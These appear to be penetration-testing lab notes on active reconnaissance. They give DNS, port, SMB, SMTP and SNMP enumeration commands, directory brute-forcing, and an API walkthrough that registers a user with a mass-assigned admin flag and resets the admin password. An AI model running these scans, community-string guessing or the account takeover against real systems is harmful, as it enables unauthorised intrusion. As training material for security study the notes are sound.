
# Information Gathering Active

## DNS Enumeration

### host

```bash
for ip in $(cat list.txt); do host $ip.megacorpone.com; done

for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
```

### dnsenum

```bash
dnsenum megacorpone.com
```

### nslookup

```bash
nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

## Port Scanning

### nc

```bash
nc -nv -z -w 1 192.168.224.151 1-10000

nc -nv -z -w 1 -u 192.168.224.151 100-200
```

### nmap

#### host discovery

```bash
nmap -sn 192.168.50.1-254 -oG ping-sweep.txt
nmap -sn 172.16.33.0/24
grep Up ping-sweep.txt | cut -d " " -f 2

sudo nmap -p 80 --script http-title.nse  192.168.224.0/24 -oN http-title-N.txt
```

#### port scanning

```bash
sudo nmap -sS 192.168.50.149
sudo nmap -sT -sU 192.168.50.149

sudo nmap -p- 192.168.208.211
for a in $(seq 1 500 65535); do let b=$((a+499)); sleep 2; echo ---$a-$b---; sudo nmap -p $a-$b 192.168.208.211 | grep open; done
```

#### service detection

The -A option includes version detection and script scanning, making -sC and -sV unnecessary.

```bash
sudo nmap -p- -A 172.16.33.35 -oN nmap.txt
```

##### SMB

```bash
sudo nmap -p 445 192.168.239.0/24 -oG smb.txt

sudo smbclient -L 192.168.174.10 -N

cat smb.txt | grep open | cut -d " " -f 2 | while read ip; do enum4linux "$ip"; done
```

##### SMTP

```bash
sudo nmap -p 25 192.168.239.0/24 -oG smtp.txt

nc -nv 192.168.239.8 25
vrfy root
```

##### SNMP

- GN

```bash
snmpwalk -c public 192.168.228.149 -v2c NET-SNMP-EXTEND-MIB::nsExtendObjects
```

| OID | Description |
| --- | ----------- |
| 1.3.6.1.2.1.25.1.6.0   | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name |
| 1.3.6.1.4.1.77.1.2.25  | User Accounts |
| 1.3.6.1.2.1.6.13.1.3   | TCP Local Ports |

```bash
sudo nmap -sU --open -p 161 192.168.239.0/24 -oG snmap.txt

echo public > community
echo private >> community
echo manager >> community
cat snmap.txt | grep snmp | cut -d " " -f 2 > snmap_ips
onesixtyone -c community -i snmap_ips

snmpwalk -v 2c -c public 192.168.239.151 1.3.6.1.2.1.25.4.2.1.2\n
snmpwalk -v 2c -c public -Oa 192.168.239.151 1.3.6.1.2.1.2.2.1.2\n
```

### Test-NetConnection

```powershell
Test-NetConnection -Port 445 192.168.50.151
```

### powershell

```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

## Directory Brute Force

### dirsearch

```bash
dirsearch -u http:// -e php,html,txt -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### gobuster

```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

## API Enumeration

robots.txt and sitemap.xml

### gobuster

```bash
cat pattern
{GOBUSTER}/v1
{GOBUSTER}/v2

gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt


```

### drill down API

```bash
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register

curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}

curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```
